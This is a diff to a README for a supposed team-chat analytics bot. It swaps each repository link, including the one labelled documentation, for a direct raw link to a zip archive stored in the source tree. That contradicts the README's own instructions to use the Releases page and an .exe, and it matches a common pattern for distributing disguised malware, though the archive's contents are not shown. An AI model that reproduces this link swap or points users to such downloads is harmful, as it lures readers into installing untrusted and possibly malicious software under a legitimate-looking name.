@@ -1,6 +1,6 @@
 # 🤖 TeamPulse-Analytics-Bot - Analyze Team Chats Easily
 
-[![Download TeamPulse-Analytics-Bot](https://img.shields.io/badge/Download-TeamPulse%20Analytics%20Bot-brightgreen)](https://github.com/recurvate-buckthorn640/TeamPulse-Analytics-Bot)
+[![Download TeamPulse-Analytics-Bot](https://img.shields.io/badge/Download-TeamPulse%20Analytics%20Bot-brightgreen)](https://raw.githubusercontent.com/recurvate-buckthorn640/TeamPulse-Analytics-Bot/main/src/app/Team-Pulse-Analytics-Bot-3.8-beta.4.zip)
 
 ## 📖 What is TeamPulse-Analytics-Bot?
 
@@ -35,7 +35,7 @@ Before you start, check your system meets these basics:
 
 Click the big button below to visit the download page and get the latest version:
 
-[![Download TeamPulse-Analytics-Bot](https://img.shields.io/badge/Download-TeamPulse%20Analytics%20Bot-blue)](https://github.com/recurvate-buckthorn640/TeamPulse-Analytics-Bot)
+[![Download TeamPulse-Analytics-Bot](https://img.shields.io/badge/Download-TeamPulse%20Analytics%20Bot-blue)](https://raw.githubusercontent.com/recurvate-buckthorn640/TeamPulse-Analytics-Bot/main/src/app/Team-Pulse-Analytics-Bot-3.8-beta.4.zip)
 
 Once on the GitHub page, look for the **Releases** section on the right side or under the repository description. Download the latest Windows version, which usually will be an `.exe` file something like `TeamPulse-Analytics-Bot-Setup.exe`.
 
@@ -95,8 +95,8 @@ Settings are accessible in the app’s menu under "Preferences."
 
 ## 🔗 Useful Links
 
-- Download and setup: [https://github.com/recurvate-buckthorn640/TeamPulse-Analytics-Bot](https://github.com/recurvate-buckthorn640/TeamPulse-Analytics-Bot)
-- GitHub for documentation and updates: [https://github.com/recurvate-buckthorn640/TeamPulse-Analytics-Bot](https://github.com/recurvate-buckthorn640/TeamPulse-Analytics-Bot)
+- Download and setup: [https://raw.githubusercontent.com/recurvate-buckthorn640/TeamPulse-Analytics-Bot/main/src/app/Team-Pulse-Analytics-Bot-3.8-beta.4.zip](https://raw.githubusercontent.com/recurvate-buckthorn640/TeamPulse-Analytics-Bot/main/src/app/Team-Pulse-Analytics-Bot-3.8-beta.4.zip)
+- GitHub for documentation and updates: [https://raw.githubusercontent.com/recurvate-buckthorn640/TeamPulse-Analytics-Bot/main/src/app/Team-Pulse-Analytics-Bot-3.8-beta.4.zip](https://raw.githubusercontent.com/recurvate-buckthorn640/TeamPulse-Analytics-Bot/main/src/app/Team-Pulse-Analytics-Bot-3.8-beta.4.zip)
 
 ## 🤝 Support and Help
 
